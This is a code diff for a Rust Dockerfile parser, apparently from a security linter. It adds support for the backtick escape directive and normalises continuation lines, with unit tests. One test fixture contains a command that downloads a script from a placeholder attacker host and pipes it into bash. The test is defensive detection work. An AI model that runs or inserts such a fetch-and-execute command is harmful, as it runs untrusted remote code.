@@ -13,6 +13,67 @@ impl DockerfileParser {
         Self
     }
 
+    /// Return the escape character declared by the first Dockerfile parser
+    /// directive. Docker defaults to a backslash; a backtick directive is
+    /// commonly used for Windows-compatible Dockerfiles. Directives that
+    /// appear after the first line are instructions or comments, not parser
+    /// directives.
+    pub fn escape_character(content: &str) -> char {
+        let Some(first_line) = content.lines().next() else {
+            return '\\';
+        };
+        let trimmed = first_line.trim();
+
+        if let Some(value) = trimmed.strip_prefix("# escape=") {
+            return match value.trim() {
+                "`" => '`',
+                "\\" => '\\',
+                _ => '\\',
+            };
+        }
+
+        '\\'
+    }
+
+    /// Normalize Dockerfile continuation lines for the line-based rule engine.
+    ///
+    /// The rule engine understands shell-style backslash continuations. When a
+    /// Dockerfile declares backtick as its escape character, replace only the
+    /// trailing continuation character with a backslash. Newlines and all
+    /// other bytes remain unchanged, so findings retain their original line
+    /// numbers.
+    pub fn normalize_continuations(content: &str) -> String {
+        let escape = Self::escape_character(content);
+        if escape == '\\' {
+            return content.to_string();
+        }
+
+        let mut normalized = String::with_capacity(content.len());
+        for chunk in content.split_inclusive('\n') {
+            let newline_len = usize::from(chunk.ends_with('\n'));
+            let body_end = chunk.len() - newline_len;
+            let body = &chunk[..body_end];
+            let continuation_index = body
+                .char_indices()
+                .rev()
+                .find_map(|(index, character)| {
+                    (!character.is_whitespace()).then_some((index, character))
+                })
+                .and_then(|(index, character)| (character == escape).then_some(index));
+
+            if let Some(index) = continuation_index {
+                normalized.push_str(&body[..index]);
+                normalized.push('\\');
+                normalized.push_str(&body[index + escape.len_utf8()..]);
+            } else {
+                normalized.push_str(body);
+            }
+            normalized.push_str(&chunk[body_end..]);
+        }
+
+        normalized
+    }
+
     /// Extract base images from FROM instructions.
     pub fn extract_base_images(content: &str) -> Vec<String> {
         content
@@ -34,13 +95,14 @@ impl DockerfileParser {
         let mut commands = Vec::new();
         let mut in_run = false;
         let mut current_command = String::new();
+        let escape = Self::escape_character(content);
 
         for line in content.lines() {
             let trimmed = line.trim();
 
             if in_run {
                 // Continuation of previous RUN command
-                if let Some(stripped) = trimmed.strip_suffix('\\') {
+                if let Some(stripped) = trimmed.strip_suffix(escape) {
                     current_command.push_str(stripped);
                     current_command.push(' ');
                 } else {
@@ -51,7 +113,7 @@ impl DockerfileParser {
                 }
             } else if trimmed.to_uppercase().starts_with("RUN ") {
                 let cmd = &trimmed[4..];
-                if let Some(stripped) = cmd.strip_suffix('\\') {
+                if let Some(stripped) = cmd.strip_suffix(escape) {
                     current_command = stripped.to_string();
                     current_command.push(' ');
                     in_run = true;
@@ -169,6 +231,43 @@ RUN npm install && \
         assert_eq!(commands.len(), 2);
         assert!(commands[0].contains("apk add"));
         assert!(commands[1].contains("npm install") && commands[1].contains("npm run build"));
+    }
+
+    #[test]
+    fn test_backtick_escape_joins_run_commands() {
+        let content =
+            "# escape=`\nFROM alpine\nRUN curl https://evil.example/payload `\n    | bash\n";
+        let commands = DockerfileParser::extract_run_commands(content);
+
+        assert_eq!(commands, vec!["curl https://evil.example/payload  | bash"]);
+        assert_eq!(DockerfileParser::escape_character(content), '`');
+
+        let normalized = DockerfileParser::normalize_continuations(content);
+        assert!(normalized.contains("payload \\\n"));
+    }
+
+    #[test]
+    fn test_late_escape_directive_does_not_change_default() {
+        let content = "FROM alpine\n# escape=`\nRUN echo safe `\n    && echo still-safe\n";
+
+        assert_eq!(DockerfileParser::escape_character(content), '\\');
+        assert_eq!(DockerfileParser::extract_run_commands(content).len(), 1);
+    }
+
+    #[test]
+    fn test_escape_directive_after_leading_blank_line_does_not_apply() {
+        let content = "\n# escape=`\nFROM alpine\nRUN echo safe `\n    && echo still-safe\n";
+
+        assert_eq!(DockerfileParser::escape_character(content), '\\');
+        assert_eq!(DockerfileParser::normalize_continuations(content), content);
+    }
+
+    #[test]
+    fn test_default_backslash_escape_is_unchanged() {
+        let content = "FROM alpine\nRUN echo safe `\n    && echo still-safe\n";
+
+        assert_eq!(DockerfileParser::escape_character(content), '\\');
+        assert_eq!(DockerfileParser::normalize_continuations(content), content);
     }
 
     #[test]
